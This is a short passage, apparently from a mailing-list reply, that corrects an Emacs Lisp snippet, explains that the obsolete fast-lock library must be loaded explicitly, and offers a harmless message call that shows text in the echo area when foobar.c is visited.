Should read setq, not seq.  You will also need to load fast-lock
explicitly before that, since it's obsolete and not automatically
loaded anymore:

(load-library "fast-lock")

Instead of " foobar ", you can put in the following which actually does
something visible:

(message "Surprise, surprise!")

This string will be put in the echo area when you visit foobar.c.
